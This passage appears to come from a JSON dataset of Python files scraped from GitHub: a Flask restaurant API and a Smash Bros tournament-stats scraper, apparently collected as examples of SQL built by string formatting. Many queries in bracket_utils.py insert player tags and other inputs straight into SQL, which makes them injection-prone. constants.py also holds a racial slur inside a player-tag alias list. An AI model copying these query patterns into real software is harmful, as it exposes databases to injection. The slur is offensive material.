query_res\n\n\n@app.route('/restaurants/<saltiness>/<sweetness>/<sourness>/<bitterness>/')\ndef query_restaurants_by_taste(saltiness, sweetness, sourness, bitterness):\n    \"\"\"\n    To query this method, use :\n    '/restaurants/<saltiness>/<sweetness>/<sourness>/<bitterness>/?key=value&key=value&...'\n    where keys are optional strings from\n    ['loclat', 'loclng', 'price_category', 'online_delivery', 'min_review']\n    and tastes (e.g. 'saltiness') are either 0 or 1\n    for example: '/restaurants/0/1/0/1/?min_review=3.5&price_category=2'\n    \"\"\"\n    logger.info(\"GET query_restaurants_by_taste query\")\n    try:\n        saltiness, sweetness, sourness, bitterness = int(saltiness), \\\n                                                     int(sweetness), \\\n                                                     int(sourness), int(bitterness)\n    except:\n        return None\n\n    restaurant_query = sql_queries.restaurant_by_taste % (\n        get_taste_condition(saltiness),\n        get_taste_condition(sweetness),\n        get_taste_condition(sourness),\n        get_taste_condition(bitterness),\n        get_taste_condition(1 - saltiness),\n        get_taste_condition(1 - sweetness),\n        get_taste_condition(1 - sourness),\n        get_taste_condition(1 - bitterness),\n    )\n    loclat, loclng = request.args.get('loclat'), request.args.get('loclng')\n    price_category = request.args.get('price_category')\n    online_delivery = request.args.get('online_delivery')\n    min_review = request.args.get('min_review')\n    if loclat != None and loclng != None:\n        lat_range = [float(loclat) - geodist, float(loclat) + geodist]\n        lng_range = [float(loclng) - geodist, float(loclng) + geodist]\n    else:\n        lat_range = None\n        lng_range = None\n    filtered_query = database.restaurant_query_builder(restaurant_query,\n                                                       lat_range, lng_range,\n                                                       price_category,\n                                                       min_review, online_delivery)\n    limited_query = database.order_by_and_limit_query(filtered_query,\n                                                    \"agg_review DESC\", 20)\n    query_res = database.run_sql_query(limited_query)\n    if query_res == -1:\n        return None\n    return query_res\n\n\ndef get_taste_condition(value):\n    if value == 1:\n        return \"0.6 AND 1\"\n    else:\n        return \"0.0 AND 0.4\"\n\n\n@app.route('/unique_ingredients/<cuisine_id>')\ndef find_unique_ingredients_from_cuisine(cuisine_id):\n    logger.info(\"GET find_unique_ingredients_from_cuisine query\")\n    if cuisine_id in unique_ingredients_cache:\n        insert_time, data = unique_ingredients_cache[cuisine_id]\n        if datetime.now() < insert_time + cache_persistence_time:\n            return data\n\n    try:\n        cuisine_id_int = int(cuisine_id)\n    except:\n        logger.error(\"Error translating cuisine_id to int in \"\n                     \"find_unique_ingredients_from_cuisine, passed value: \"\n                     \"%s\" % cuisine_id)\n        return None\n\n    query_res = database.find_unique_ingredients_of_cuisine(cuisine_id_int, 500)\n    if query_res == -1:\n        return None\n    if len(simplejson.loads(query_res)) == 0:  # try again with smaller filter\n        query_res = database.find_unique_ingredients_of_cuisine(cuisine_id_int,\n                                                                250)\n        if query_res == -1:\n            return None\n        unique_ingredients_cache[cuisine_id] = (datetime.now(), query_res)\n        return query_res\n    else:\n        unique_ingredients_cache[cuisine_id] = (datetime.now(), query_res)\n        return query_res\n\n\n@app.route('/new_franchise/<lat>/<lng>')\ndef set_up_new_franchise(lat, lng):\n    try:\n        lat, lng = float(lat), float(lng)\n    except:\n        logger.error(\"Error translating location to floats in \"\n                     \"set_up_new_franchise, passed values: \"\n                     \"lat: %s, lng: %s\" % (lat, lng))\n\n    query_res = database.set_up_new_franchise(lat, lng, 0.015)\n    if query_res == -1:\n        return None\n    return query_res\n\n\n@app.route('/get_common_ingredients_with/<ingredient>')\ndef get_common_ingredients_with(ingredient):\n    result = database.query_common_ingredients_with(ingredient)\n    if result == -1:\n        return None\n    else:\n        return result\n\n\nif __name__ == '__main__':\n    app.run(port=port_number)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DKelle/Smash_stats/blob/7dadd601bcf554ab6cea362b643d60678759cd0f",
        "file_path": "/bracket_utils.py",
        "source": "from time import sleep\nimport operator\nfrom bs4 import BeautifulSoup\nfrom requests import get\nimport constants\nimport logger\nimport re\nimport os\nimport pickle\nimport pysmash\nfrom get_results import get_coalesced_tag\nimport datetime\n\nDEFAULT_BASE_URLS = ['https://challonge.com/NP9ATX###', 'http://challonge.com/heatwave###', 'https://austinsmash4.challonge.com/atx###',\\\n        'http://challonge.com/RAA_###']\n\ndebug = False\nLOG = logger.logger(__name__)\n\ndef _get_first_valid_url(base_url):\n\n    #Start from 1, and increment the number at the end or URL until we find a valid URL\n    valid = False\n    index = 1\n    while(not valid):\n        url = base_url.replace('###', str(index))\n        data, status = hit_url(url)\n\n        if status < 300 and is_valid(data, url=base_url):\n            if debug: print('url ' + url + ' is valid')\n            valid = True\n        else:\n            if debug: print('url ' + url + ' is not valid')\n            index = index + 1\n\n    return index\n\ndef _get_last_valid_url(base_url, start=1):\n\n    #We know that URL number 'start' is valid. What is the next invalid URL?\n    invalid_count = 0\n    end = start #Use this to keep track of the last valid URL\n\n    #Sometimes a week is skipped -- Make sure we see 100 invalid URLs in a row before calling it quits\n    while(invalid_count <= 30):\n        #if base_url == \"https://austinsmash4.challonge.com/atx145\":\n        #    print\n        url = base_url.replace('###', str(start))\n        print('about to check url {}'.format(url))\n        if debug: print('start is ' + str(start))\n\n        data, status = hit_url(url)\n\n        if status < 300  and is_valid(data, url=base_url):\n            if debug: print('url ' + str(url) + ' is valid')\n            invalid_count = 0\n            end = start\n        else:\n            invalid_count = invalid_count + 1\n\n        start = start + 1\n    return end\n\ndef get_valid_url_range(base_url):\n    # Try to get this data form pickle\n    start_end = load_pickle_data(base_url)\n    if start_end:\n        start, end = start_end\n\n        # See if there have been new brackets since we pickled this data\n        end = _get_last_valid_url(base_url, end)\n\n    else:\n        start = _get_first_valid_url(base_url)\n        end = _get_last_valid_url(base_url, start)\n\n    dump_pickle_data(base_url, (start,end))\n\n    return start, end\n\ndef dump_pickle_data(base_fname, data):\n    cwd = os.getcwd()\n\n    # Go from https://ausin_melee_bracket -> austin_melee_bracket\n    bracket_name = base_fname.replace('/', '_')\n    fname = cwd+'/pickle/'+str(bracket_name)+'.p'\n\n    with open(fname, \"wb\") as p:\n        pickle.dump(data, p)\n\ndef load_pickle_data(base_fname):\n    if debug: print('attempting to get pickle data for ', base_fname)\n    # Attempt to get data from pickle\n    cwd = os.getcwd()\n\n    # Go from https://ausin_melee_bracket -> austin_melee_bracket\n    bracket_name = base_fname.replace('/', '_')\n    fname = cwd+'/pickle/'+str(bracket_name)+'.p'\n    LOG.info('attempting to load pickle data for {}'.format(fname))\n\n    try:\n        with open(fname, 'rb') as p:\n            data = pickle.load(p)\n            return data\n\n    except FileNotFoundError:\n        LOG.info('could not load pickle data for {}'.format(fname))\n        if debug: print('failed to get pickle data for ', base_fname)\n        return None\n\ndef hit_url(url, load_from_cache=True):\n    # Before we try to hit this URL, see if we have pickle data for it\n\n    if load_from_cache:\n        data =  load_pickle_data(url)\n        if data:\n            return data, 200\n\n    #sleep, to make sure we don't go over our rate-limit\n    sleep(.02)\n\n    #Get the html page\n    r = get(url)\n    data = r.text\n\n    if(is_valid(data, url=url) and load_from_cache):\n        # Make sure we pickle this data, so we can get it next time\n        dump_pickle_data(url, data)\n\n    return data, r.status_code\n\ndef get_brackets_from_user(scene_url, total=None, pages=None):\n    # Given the url for a given scene (https://austinsmash4.challonge.com)\n    # Return all of the brackets hosted by said scene\n\n    # 'total' is number of brackets to get. If None, get all. Usually either None or 1\n\n    def get_bracket_urls_from_scene(scene_url, load_from_cache=True):\n        # Given a specific page of a scene, parse out the urls for all brackets\n        # eg inputhttps://austinsmash4.challonge.com?page=4\n        # The above URL contains a list of brackets. Find those bracket URLs\n        scene_brackets_html, status = hit_url(scene_url, load_from_cache=load_from_cache)\n        scene_name = scene_url.split('https://')[-1].split('.')[0]\n        soup = BeautifulSoup(scene_brackets_html, \"html.parser\")\n\n        links = soup.find_all('a')\n        bracket_links = []\n        for link in links:\n            if link.has_attr('href') and scene_name in link['href']:\n                # Make sure this is a real bracket\n                html = get_bracket(link['href'])\n                if html and is_valid(html, url = link['href']):\n                    bracket_links.append(link['href'])\n\n                    # If we have more than 'total' links, we can return them now\n                    if total and len(bracket_links) >= total:\n                        return bracket_links\n        return bracket_links\n\n    # This scene may have multiple pages.\n    # eg, https://austinsmash4.challonge.com?page=###\n    # Find all the pages\n    # Then find all the URLs for each page\n    scene_url_with_pages = scene_url + '?page=###'\n    start, end = get_valid_url_range(scene_url_with_pages)\n    brackets = []\n    for i in range(start, end+1):\n        # It is possible that page 1 has changed since last time we checked. Don't load this page from cache\n        cache = i > 1\n        scene_url = scene_url_with_pages.replace('###', str(i))\n        page_brackets = get_bracket_urls_from_scene(scene_url, cache)\n        brackets.extend(page_brackets)\n\n        # If we have more than 'total' links, we can return them now\n        if total and len(brackets) >= total:\n            return brackets\n\n        # If we have already gotten urls from 'pages' pages, we can return now\n        iterations = (start - i) + 1\n        if pages and iterations >= pages:\n            return brackets\n\n    # Reverse this list so list[0] is the oldest bracket, and list[-1] is the newest bracket\n    return brackets[::-1]\n\ndef is_valid(html, url=None):\n\n    #Check to see if this tournament page exists\n    errors= ['The page you\\'re looking for isn\\'t here', 'No tournaments found',\\\n            \"Internal Server Error\",\n            \"Not Implemented\",\n            \"Bad Gateway\",\n            \"Gateway Time-out\",\n            \"Gateway Timeout\",\n            \"Service Unavailable\",\n            \"Gateway Timeout\",\n            \"HTTP Version Not Supported\",\n            \"Variant Also Negotiates\",\n            \"Insufficient Storage\",\n            \"Loop Detected\",\n            \"Not Extended\",\n            \"Network Authentication Required\"]\n    for error in errors:\n        if error.lower() in str(html).lower():\n            if debug:\n                print('page invalid, found error string {}'.format(error))\n            return False\n\n    # If we are on a bracket, we need to make sure it is complete.\n    # But, this might be a users page, eg. https://challonge.com/users/kuya_mark96\n    # If that is the case, we shouldn't check for completeness\n    if 'member since' in str(html).lower():\n        return True\n\n    # It may also be a page like this... http://smashco.challonge.com\n    # Which is similar to a users page. Also don't check for completeness\n    if 'organizations' in str(html).lower():\n        return True\n\n    # This might be a 'standings' page, like https://challongw.com/RAA_1/standings\n    if url and 'standings' in url:\n        return True\n\n    return bracket_complete(html)\n\n\ndef bracket_complete(data):\n    # Are there any matches that haven't been played yet?\n    if \"player1\" not in data.lower() and \"player2\" not in data.lower():\n        if debug:\n            print('didnt find any players, must be invalid')\n        return False\n    if '\"player1\":null' in data.lower() or '\"player2\":null' in data.lower():\n        if debug:\n            print('found a null player, must be invalid')\n        return False\n\n    return True\n    \ndef get_bracket(url):\n    if debug:\n        print('about to get bracket for url {}'.format(url))\n\n    data, status = hit_url(url)\n\n    # Create the Python Object from HTML\n    soup = BeautifulSoup(data, \"html.parser\")\n\n    # the bracket is inside a 'script' tag\n    script = soup.find_all('script')\n    bracket = None\n    for s in script:\n        if 'matches_by_round' in str(s):\n            #We found the actual bracket. S contains all data about matches\n            index = str(s).index('matches_by_round')\n            s = str(s)[index:]\n            bracket = (s)\n\n    if debug: print('got bracket: \\n', bracket)\n\n    return bracket\n\ndef get_sanitized_bracket(url, symbol=\"{}\"):\n    bracket = get_bracket(url)\n    sanitized = sanitize_bracket(bracket, symbol) if bracket else None\n    return sanitized\n\ndef sanitize_bracket(bracket, symbol=\"{}\"):\n    #Which symbol should we be trying to match on? It will be either () or {}\n    opn = symbol[0]\n    close = symbol[-1]\n\n    index = bracket.index(opn)\n\n    #Cut off everything up until the first open bracket\n    bracket = bracket[index:]\n\n    #use a queue to cut off everything after the aligning close bracket\n    count = 0\n    for i, letter in enumerate(bracket):\n        if letter == opn:\n            count = count + 1\n        if letter == close:\n            count = count - 1\n\n            #Also check to see if this is the final closing bracket\n            if count == 0:\n                index = i\n                break\n\n    bracket = bracket[:index+1]\n    return bracket\n\ndef get_tournament_placings(bracket_url):\n    # Map tags to their respective placings in this bracket\n    placings_map = {}\n\n    if 'challonge' in bracket_url:\n        LOG.info('just entering \"get tournament palcings')\n        standings_html, status = hit_url(bracket_url+'/standings')\n        soup = BeautifulSoup(standings_html, \"html.parser\")\n        tds = soup.find_all('td')\n\n        # Cycle thorugh these tds, and find the ones that represent different placings\n        current_placing = 1\n        for td in tds:\n            if td.has_attr('class') and td['class'][0] == 'rank':\n                current_placing = int(td.getText())\n            span = td.find('span')\n            # Player tags are kept in <span> elements\n            if span:\n                player = span.getText()\n\n                # Coalesce tags\n                player = get_coalesced_tag(player)\n                placings_map[player.lower()] = current_placing\n                LOG.info('just got placing {} for player {} in bracket {}'.format(current_placing, player, bracket_url))\n\n    # This bracket is from smashgg\n    else:\n        smash = pysmash.SmashGG()\n        url_parts = bracket_url.split('/')\n\n        if 'tournament' in url_parts and 'events' in url_parts:\n            t = url_parts[url_parts.index('tournament')+1]\n            e = url_parts[url_parts.index('events')+1]\n            players = smash.tournament_show_players(t, e)\n            for player_dict in players:\n                tag = player_dict['tag']\n                # sanitize the tag\n                tag = ''.join([i if ord(i) < 128 else ' ' for i in tag])\n                place = player_dict['final_placement']\n                placings_map[tag.lower()] = place\n\n    return placings_map\n\ndef player_in_url(db, player, urls):\n\n    sql = \"SELECT * FROM matches WHERE (player1='{}' or player2='{}')\".format(player, player, urls)\n    if len(urls) > 0:\n        sql = sql + \" and (url='{}'\".format(urls[0])\n        for url in urls[1:]:\n            sql = sql + \" or url='{}'\".format(url)\n        sql = sql + \");\"\n    res = db.exec(sql)\n\n    if len(res) > 0:\n        return True\n    LOG.info('player {} is not in {}'.format(player, urls))\n    return False\n\ndef player_in_bracket(player, bracket=None):\n    # Make sure to add quotations around the tag\n    # this way, we ony match on actual tags, and not *tag*\n    #player = '<title>'+player+'</title>'\n\n    # This player may have multiple tags\n    # Check if any of them are in the bracket\n    tags = get_coalesce_tags(player)\n    for tag in tags:\n        if re.search(tag, bracket, re.IGNORECASE):\n            return True\n    return False\n\ndef get_coalesce_tags(player):\n    for tags in constants.TAGS_TO_COALESCE:\n        if player in tags:\n            return tags\n    # If this tag does not need to be coalesced, just return a list of this\n    return [player]\n\ndef get_urls_with_players(players=[\"Christmas Mike\", \"christmasmike\"], base_urls=DEFAULT_BASE_URLS):\n    urls = []\n    for base in base_urls:\n        start, end = get_valid_url_range(base)\n        for i in range(start, end+1):\n            bracket_url = base.replace('###', str(i))\n            bracket = get_sanitized_bracket(bracket_url)\n            for player in players:\n                if bracket and player_in_bracket(player, bracket=bracket):\n                    urls.append(bracket_url)\n                    break\n    return urls\n\ndef get_list_of_scenes():\n    austin = constants.AUSTIN_URLS\n    smashbrews = constants.SMASHBREWS_RULS\n    colorado = constants.COLORADO_SINGLES_URLS\n    colorado_doubles = constants.COLORADO_DOUBLES_URLS\n    sms = constants.SMS_URLS\n    base_urls = [sms, smashbrews, austin, colorado_doubles, colorado]\n    return base_urls\n\ndef get_list_of_named_scenes():\n    austin = constants.AUSTIN_URLS\n    smashbrews = constants.SMASHBREWS_RULS\n    colorado_singles = constants.COLORADO_SINGLES_URLS\n    colorado_doubles = constants.COLORADO_DOUBLES_URLS\n    sms = constants.SMS_URLS\n    base_urls = [['sms', sms], ['smashbrews', smashbrews], ['austin', austin], ['colorado', colorado_singles], ['colorado_doubles', colorado_doubles]]\n    return base_urls\n\ndef get_list_of_scene_names():\n    return ['sms', 'austin', 'smashbrews', 'colorado', 'colorado_doubles', 'pro', 'pro_wiiu', 'test1', 'test2']\n\ndef get_last_n_tournaments(db, n, scene):\n    today = datetime.datetime.today().strftime('%Y-%m-%d')\n    return get_n_tournaments_before_date(db, scene, today, n)\n\ndef get_first_month(db, scene):\n    sql = \"select date from matches where scene='{}' order by date limit 1;\".format(scene)\n    res = db.exec(sql)\n    date = res[0][0]\n    return date\n\ndef get_next_month(date):\n    y, m, d = date.split('-')\n    m = '01' if m == '12' else str(int(m)+1).zfill(2)\n    y = str(int(y)+1).zfill(2) if m == '01' else y\n    date = '{}-{}-{}'.format(y, m, d)\n    return date\n\ndef get_previous_month(date):\n    y, m, d = date.split('-')\n    m = '12' if m == '01' else str(int(m) - 1).zfill(2)\n    y = str(int(y) - 1).zfill(2) if m == '12' else y\n    date = '{}-{}-{}'.format(y, m, d)\n    return date\n\ndef get_last_month(db, scene):\n    sql = \"select date from matches where scene='{}' order by date desc limit 1;\".format(scene)\n    res = db.exec(sql)\n    date = res[0][0]\n\n    # If it has been more than 1 month since this last tournament,\n    # go ahead and round this date up by a 1 month\n    # eg, if the last tournament was 2015-01-15 (a long time ago)\n    # we can assume the scene won't have more tournaments\n    # So just round to 2015-02-01\n    today = datetime.datetime.today().strftime('%Y-%m-%d')\n    y, m, d = today.split('-')\n    cy, cm, cd = date.split('-')\n    if y > cy or m > cm:\n        # Add 1 to the month before we return\n        # eg 2018-03-01 -> 2018-04-01\n        date = get_next_month(date)\n\n    return date\n\ndef get_first_ranked_month(db, scene, player):\n    sql = \"select date from ranks where scene='{}' and player='{}' order by date limit 1;\".format(scene, player)\n    res = db.exec(sql)\n    date = res[0][0]\n    return date\n\ndef get_last_ranked_month(db, scene, player):\n    sql = \"select date from ranks where scene='{}' and player='{}' order by date desc limit 1;\".format(scene, player)\n    res = db.exec(sql)\n    date = res[0][0]\n    return date\n\ndef iter_months(first, last, include_first=True, include_last=False):\n    # Both first and last are date strings in the format yyyy-mm-dd\n\n    y, m, d = first.split('-')\n    last_y, last_m, last_d = last.split('-')\n    cur = '{}-{}'.format(y, m)\n    last = '{}-{}'.format(last_y, last_m)\n\n    # Calculate ranks on the first of every month between first and last\n    months = []\n    if include_first:\n        months.append('{}-01'.format(cur))\n\n\n    op = operator.ge if include_last else operator.gt\n    while op(last, cur):\n        m = str(int(m) + 1)\n\n        if m == '13':\n            m = '01'\n            y = str(int(y) + 1)\n\n        # Make sure to pad the month with 0s\n        m = m.zfill(2)\n        cur = '{}-{}'.format(y, m)\n        months.append('{}-01'.format(cur))\n\n    # We don't actually want to include this last month.\n    # Eg. if the last tournament was played on 2018-02-04, we don't want to calculate the ranks\n    # For Feb. until March starts\n\n    return months[:len(months)-1]\n\ndef has_month_passed(date):\n    y, m, d = date.split('-')\n    today = datetime.datetime.today().strftime('%Y-%m-%d')\n    today_y, today_m, today_d = today.split('-')\n\n    # Are these two in the same month?\n    if m == today_m:\n        return False\n\n    # Otherwise, we know that 'date' is in the past, and 'today' is current.\n    # We must be in a new month now. Always rank on the 1st\n    if today_d == '01':\n        return True\n\n    return False\n\ndef get_monthly_ranks_for_scene(db, scene, tag):\n\n    sql = \"SELECT date, rank FROM ranks WHERE scene='{}' AND player='{}'\".format(scene, tag)\n    res = db.exec(sql)\n\n    res = [r for r in res if played_during_month(db, scene, tag, get_previous_month(r[0]))]\n\n    # Build up a dict of {date: rank}\n    ranks = {}\n    for r in res:\n        ranks[r[0]] = r[1]\n\n    return ranks\n\ndef get_ranking_graph_data(db, tag):\n    # First, we have to find out which scenes this player is ranked in\n    sql = \"SELECT DISTINCT scene FROM ranks WHERE player='{}'\".format(tag)\n    scenes = db.exec(sql)\n    scenes = [s[0] for s in scenes]\n\n    # Get the first time we were ranked in each of these scenes\n    first_months = [get_first_ranked_month(db, s, tag) for s in scenes]\n    last_months = [get_last_ranked_month(db, s, tag) for s in scenes]\n\n    first_month = min(first_months)\n    last_month = max(last_months)\n\n    # Get a list of each month that we want to know the ranks for\n    iterated_months = iter_months(first_month, last_month, include_last=True)\n\n    # Get individual rankings per month, per scene\n    arank = get_monthly_ranks_for_scene(db, 'austin', 'christmasmike')\n\n    monthly_ranks_per_scene = {s:get_monthly_ranks_for_scene(db, s, tag) for s in scenes}\n\n    ranks_per_scene = {s:[] for s in scenes}\n    # Reformat this data to use with Zing\n    for month in iterated_months:\n        for s in scenes:\n            scene_ranks = monthly_ranks_per_scene[s]\n            if month in scene_ranks:\n                ranks_per_scene[s].append([month, scene_ranks[month]])\n\n    \n\n    return ranks_per_scene, iterated_months\n\ndef get_bracket_placings_in_scene(db, scene, tag):\n    sql = \"select distinct matches.date, placings.place from placings join matches on \\\n            matches.url=placings.url where scene='{}' and ((player1='{}' and placings.player=player1) or \\\n            (player2='{}' and placings.player=player2));\".format(scene, tag, tag)\n    print(sql)\n    res = db.exec(sql)\n\n    # Convert all placings to ints\n    res = [[r[0], int(r[1])] for r in res]\n    return res\n\ndef get_bracket_graph_data(db, tag):\n    # First, we have to find out which scenes this player has brackets in\n    sql = \"SELECT DISTINCT scene FROM ranks WHERE player='{}'\".format(tag)\n    scenes = db.exec(sql)\n    scenes = [s[0] for s in scenes]\n\n    bracket_placings_by_scene = {s: get_bracket_placings_in_scene(db, s, tag) for s in scenes}\n\n    return bracket_placings_by_scene\n\n\ndef get_tournaments_during_month(db, scene, date):\n    y, m, d = date.split('-')\n    ym_date = '{}-{}'.format(y, m)\n    sql = \"select url, date from matches where scene='{}' and date like '%{}%' group by url, date order by date\".format(scene, ym_date)\n    res = db.exec(sql)\n    urls = [r[0] for r in res]\n    return urls\n\ndef played_during_month(db, scene, tag, date):\n    # First, which tournaments were hosted during this month?\n    tournaments = get_tournaments_during_month(db, scene, date)\n\n    if player_in_url(db, tag, urls=tournaments):\n        return True\n\n    return False\n\ndef get_n_tournaments_before_date(db, scene, date, limit):\n    sql = \"select url, date from matches where scene='{}' and date<='{}' group by url, date order by date desc limit {};\".format(scene, date, limit)\n    res = db.exec(sql)\n    urls = [r[0] for r in res]\n    return urls, date\n\ndef get_n_tournaments_after_date(db, scene, date, limit):\n    sql = \"select url, date from matches where scene='{}' and date>='{}' group by url, date order by date desc limit {};\".format(scene, date, limit)\n    res = db.exec(sql)\n    urls = [r[0] for r in res]\n    return urls, date\n\ndef get_date(url):\n    url = url + \"/log\"\n    bracket, status = hit_url(url)\n\n    # TODO figure out what to do if this string is not in\n    s2 = '2015-03-07'\n    if 'created_at' not in bracket:\n        return s2\n\n    first_occurance = str(bracket).index('created_at')\n    bracket = bracket[first_occurance:]\n\n    #TODO if one day this code randomly stop working, it's probably this\n    s = 'created_at\":\"'\n    i = len(s)\n    i2 = len(s2) + i\n    date = bracket[i:i2]\n    y = date.split('-')[0]\n    m = date.split('-')[1]\n    d = date.split('-')[2]\n\n    return date\n\ndef get_matches_from_urls(db, urls):\n    matches = set()\n    for url in urls:\n        sql = \"SELECT * FROM matches WHERE url='{}';\".format(url)\n        res = set(db.exec(sql))\n        matches |= set(res)\n\n    return matches\n\ndef get_display_base(url, counter=None):\n    # Try to get the title of this challonge page, maybe the creator gave it a good display name\n    if 'challonge' in url:\n        html, _ = hit_url(url)\n        soup = BeautifulSoup(html, \"html.parser\")\n\n        display_name = soup.find('div', {'id' :'title'})\n        if display_name and hasattr(display_name, 'title'):\n            title = display_name.text.rstrip().lstrip()\n            name = re.sub(\"[^a-z A-Z 0-9 # / \\ .]\",'', title)\n            return name\n        else:\n            LOG.info('url {} has no title'.format(url))\n\n        # We couldn't find the title in a div. It may be in an h1\n        display_name = soup.find('h1', {'class': 'title'})\n        if display_name:\n            name = display_name.find(text=True).lstrip().rstrip()\n            LOG.info('just found new title for url: {} - {}'.format(url, name))\n\n            return name\n\n    # We couldn't find a title in the HTML. See if we have a hard-coded one\n    d_map = constants.DISPLAY_MAP\n    for k in d_map:\n        if  k.lower() in url.lower():\n            base = d_map[k]\n            if counter:\n                name = '{} {}'.format(base, counter)\n                return name\n            return base\n    \n    # If this is a pro bracket, just pull the name out of the URL\n    if 'smash.gg' in url:\n        parts = url.split('event')[0].split('/')[-2].split('-')\n        display_list = [s.title() for s in parts]\n        return ' '.join(display_list)\n\n    # None of the above methods worked. Just call this by its URL\n    return url\n\ndef get_smashgg_brackets(pages=None, all_brackets=True, singles=True, scene='pro'):\n    results = 0\n    per_page = 5\n    page = 1 if pages == None else pages[0]\n    brackets = {}\n    smash = pysmash.SmashGG()\n\n    def iterate():\n        print('PAGE {}'.format(page))\n        # melee\n        #results_url = 'https://smash.gg/results?per_page=5&filter=%7B%22completed%22%3Atrue%2C%22videogameIds%22%3A%221%22%7D&page={}'.format(page)\n        results_url = \"https://smash.gg/tournaments?per_page=30&filter=%7B%22upcoming%22%3Afalse%2C%22videogameIds%22%3A4%2C%22past%22%3Atrue%7D&page={}\".format(page)\n        \n        #wiiu\n        #results_url = 'https://smash.gg/results?per_page=5&filter=%7B%22completed%22%3Atrue%2C%22videogameIds%22%3A3%7D&page={}'.format(page)\n\n        #Get the html page\n        r = get(results_url)\n        data = r.text\n        soup = BeautifulSoup(data, \"html.parser\")\n        grep = 'singles' if singles else 'doubles'\n        #print(data)\n\n        links = soup.find_all('a')\n        for link in links:\n            try:\n                if link.has_attr('href') and 'tournament' in link['href']:\n                    url_parts = link['href'].split('/')\n\n                    t = url_parts[url_parts.index('tournament')+1]\n                    if t in brackets:\n                        continue\n\n                    events = smash.tournament_show_events(t)\n                    def get_event(events, matches):\n                        # Do we have a melee singles event?\n                        for e in events['events']:\n                            if all([match in e for match in matches]):\n                                return e\n                                \n                        return None\n\n                    if scene=='pro_wiiu':\n                        e = get_event(events, ['wii', 'single'])\n                        if e == None:\n                            e = get_event(events, ['single'])\n                        if e == None:\n                            e = get_event(events, ['wii'])\n                        if e == None:\n                            e = get_event(events, ['smash-4'])\n                        if e == None:\n                            e = get_event(events, ['smash4'])\n                        if e == None:\n                            e = get_event(events, ['smash'])\n                        if e == None:\n                            continue\n\n                    elif scene=='pro':\n                        e = get_event(events, ['melee', 'single'])\n                        if e == None:\n                            e = get_event(events, ['single'])\n                        if e == None:\n                            e = get_event(events, ['gamecube'])\n                        if e == None:\n                            e = get_event(events, ['melee'])\n                        if e == None:\n                            e = get_event(events, ['smash'])\n                        if e == None:\n                            continue\n\n                    url = 'https://smash.gg/tournament/{}/events/{}'.format(t, e)\n                    brackets[t] = url\n                    with open('threaded_smash_gg_brackets.txt', 'a') as f:\n                        f.write('PAGE{}[[{}]]\\n'.format(page, url))\n\n                    \n            except Exception as e:\n                continue\n\n    if pages:\n        for page in pages:\n            iterate()\n    else:\n        while results < 7730:\n            iterate()\n            results = results + per_page\n            page = page + 1\n\n    return brackets\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DKelle/Smash_stats/blob/7dadd601bcf554ab6cea362b643d60678759cd0f",
        "file_path": "/constants.py",
        "source": "import MELEE_SINGLES_BRACKETS\nimport WIIU_BRACKETS\nimport SMASH_5_BRACKETS\n\nDNS = 'ec2-18-218-117-97.us-east-2.compute.amazonaws.com'\n\nTAGS_TO_COALESCE = [['christmasmike', 'thanksgiving mike', 'christmas mike', 'christmas mike xmas', 'christmas mike late', 'halloween mike', 'im 12', 'im12'],\n        ['circuits', 'circuits', 'jkelle', 'circuits xmas'],\n        ['gamepad', 'sms gamepad'],\n        ['remo', 'su remo'],\n        ['kuro', 'ss kuro'],\n        ['pixlsugr', 'pixlsug', 'pixlsugar'],\n        ['b00', 'boo'],\n        ['hnic', 'hnic xmas'],\n        ['1111', '11 11', 'vuibol'],\n        ['qmantra', 'qmantra xmas'],\n\t['megafox', 'su | megafox'],\n\t['hakii', 'su l hakii', 'su | hakii', 'su redriot i hakii', 'hih | hakii', 'su | sleepyhakii', 'su|hakii', 'su | hakii $', 'su  redriot i hakii', 'hoh | hakii', 'su| hakii'],\n\t['lucy', 'ttn | lucy'],\n        ['moist', 'f9moist', 'kuyamoist'],\n\t['sassy', 'atx | sassy', 'f9sassy'],\n\t['crump', 'donald crump', 'captain crump', 'abc | crump'],\n\t['dragonite', 'datuglynigwhofkurmomin2ndgrade', 'tmg dragonite', 'su dragonite', 'su | dragonite', 'tpwn | dragonite', 'tpwn | dragonite_pr', 'tpwn| dragonite (gnw)', 'atx hoh | dragonite', 'dragonite_pr', 'hoh | dragonite', 'mega dragonite', 'tpwn|dragonite', 'armada | dragonite', 'aes | dragonite'],\n\t['gallium', 's.e.s punk', 'ses punk'],\n\t['mt', 'mt_'],\n\t['wolf', ' wolf'],\n\t['fx | albert', 'albert'],\n\t['ul | jf', 'jf', 'ul| jf', 'ul i jf'],\n\t['take a seat', 'take a \\_', 'take a \\\\_', 'takeaseat', 'take a seat xmas'],\n\t['bobby big ballz', 'bobby big balls'],\n\t['prof. cube', 'type r professor cube', 'prof cube', 'professor cube', 'profesor cube', 'cube', 'processorcube', 'prof cube $'],\n\t['cashoo', 'hoh | cashoo', 'hoh l cashoo', 'cash00'],\n\t['ul | chandy', 'ul| chandy', 'cnb | chandy', 'chandy'],\n\t['spankey', 'spanky'],\n\t['jack the reaper', 'jackthereaper'],\n\t['xlll', 'xiii'],\n\t['cheesedud6', '/cheesedud6'],\n\t['kj', 'go! kj', 'go kj'],\n\t['jtag', 'tgl | jtag', 'sms | jtag', 'sms jtag', 'jtg', 'j tag'],\n\t['jka', 'tgl | jka'],\n\t['fcar', 'tgl | fcar'],\n\t['resident', 'tgl | resident'],\n\t['minty!', 'tgl | minty!', 'tgl | minty', 'minty'],\n\t['willow', 'willowette'],\n\t['messiah', 'maple'],\n\t['tenni', 'go! tenni'],\n\t['cruzin', 'sa  cruzin'],\n\t['christmasmitch', 'mitchell', 'mitchell slan'],\n        ['jibs', 'sfu jibs'],\n        ['trane', 'irn trane'],\n        ['ninjafish', 'sa  ninjafish'],\n        ['mufin', 'sfu mufin'],\n        ['jowii', 'jo wii'],\n        ['gudlucifer', 'good lucifer', 'goodlucifer', 'gudlucifer wolf'],\n        ['ehmon', 'tgl ehmon', 'tgl  ehmon', 'ah ehmon', 'sms ehmon', 'sms | ehmon', 'tgl | ehmon', 'ehhhmon'],\n        ['pollo loco', 'pollo'],\n        ['doombase', 'retiredbase'],\n        ['majinmike', 'majin mike'],\n        ['karonite', 'red velvet', 'aos redvelvet', 'redvelvet']]\n\n# TODO DO NOT ADD MORE BRACKETS WITHOUT ADDING A CORRESPONDING DISPLAY NAME!!\nAUSTIN_URLS = ('austin', {'enumerated': ['http://challonge.com/heatwave###', 'https://challonge.com/NP9ATX###', 'http://challonge.com/hw###', 'https://challonge.com/alibaba###'], 'users': 